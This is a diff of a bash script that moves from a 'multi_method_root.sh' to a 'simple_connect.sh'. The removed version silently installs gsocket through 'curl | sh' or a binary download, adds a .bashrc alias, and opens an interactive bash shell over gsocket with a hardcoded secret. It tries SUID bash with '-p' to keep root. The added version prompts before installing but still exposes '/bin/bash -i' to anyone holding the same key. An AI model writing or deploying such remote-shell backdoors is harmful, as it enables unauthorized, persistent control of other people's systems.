@@ -1,62 +1,57 @@
 #!/bin/bash
-# multi_method_root.sh
+# simple_connect.sh
 
-KEY="CbadUt4YWKZmnNunoxGEmx"
+SECRET="CbadUt4YWKZmnNunoxGEmx"
 
-echo "=== MULTI-METHOD ROOT ACCESS ==="
+echo "[*] Simple Connection Script"
 echo ""
 
-# Method 0: Install gsocket if missing
-install_gsocket() {
-    echo "[*] Installing gsocket..."
+# Check gsocket
+if ! command -v gsocket >/dev/null 2>&1; then
+    echo "[-] ERROR: gsocket command not found!"
+    echo ""
+    echo "[*] Quick install commands:"
+    echo "--------------------------------"
+    echo "1. With sudo:"
+    echo "   curl -sSL https://gsocket.io/install.sh | sudo sh"
+    echo ""
+    echo "2. Without sudo (user install):"
+    echo "   mkdir -p ~/.local/bin"
+    echo "   cd ~/.local/bin"
+    echo "   wget https://github.com/hackerschoice/gsocket/releases/latest/download/gsocket.bin"
+    echo "   chmod +x gsocket.bin"
+    echo "   ln -s gsocket.bin gsocket"
+    echo "   export PATH=\"\$HOME/.local/bin:\$PATH\""
+    echo "--------------------------------"
+    echo ""
+    read -p "Install gsocket now? (y/n): " -n 1 -r
+    echo ""
     
-    # Method A: Official script
-    echo "[A] Trying official installer..."
-    timeout 30 curl -sSL https://gsocket.io/install.sh | sh 2>/dev/null
-    
-    if ! command -v gsocket &> /dev/null; then
-        # Method B: Direct binary download
-        echo "[B] Downloading binary..."
-        mkdir -p ~/.gsocket
-        cd ~/.gsocket
+    if [[ $REPLY =~ ^[Yy]$ ]]; then
+        echo "[*] Installing..."
+        mkdir -p ~/.local/bin
+        cd ~/.local/bin
         wget -q https://github.com/hackerschoice/gsocket/releases/latest/download/gsocket.bin
         chmod +x gsocket.bin
-        export PATH="$PATH:$(pwd)"
+        ln -sf gsocket.bin gsocket
+        export PATH="$HOME/.local/bin:$PATH"
         
-        # Create alias
-        echo 'alias gsocket="~/.gsocket/gsocket.bin"' >> ~/.bashrc
-        source ~/.bashrc
-    fi
-    
-    # Verify
-    if command -v gsocket &> /dev/null; then
-        echo "[+] gsocket ready!"
-        return 0
+        if command -v gsocket >/dev/null 2>&1; then
+            echo "[+] Installed successfully!"
+        else
+            echo "[-] Installation failed"
+            exit 1
+        fi
     else
-        echo "[-] Failed to install"
-        return 1
+        echo "[*] Exiting..."
+        exit 1
     fi
-}
-
-# Main
-if ! command -v gsocket &> /dev/null; then
-    install_gsocket
 fi
 
-if command -v gsocket &> /dev/null; then
-    echo -e "\n[*] Connecting with key: ${KEY:0:10}..."
-    
-    # Try SUID bash first
-    if [ -u /bin/bash ]; then
-        echo "[+] Using SUID bash for root"
-        exec gsocket -s "$KEY" /bin/bash -p -i
-    else
-        echo "[+] Using regular shell"
-        exec gsocket -s "$KEY" /bin/bash -i
-    fi
-else
-    echo -e "\n[-] Cannot proceed without gsocket"
-    echo "[*] Please install manually:"
-    echo "    1. curl -sSL https://gsocket.io/install.sh | sh"
-    echo "    2. Then run: gsocket -s $KEY /bin/bash -i"
-fi
+echo "[+] gsocket found: $(which gsocket)"
+echo "[*] Connecting..."
+echo "[*] Use 'exit' to quit"
+echo "=============================="
+
+# Try to connect
+gsocket -s "$SECRET" /bin/bash -i
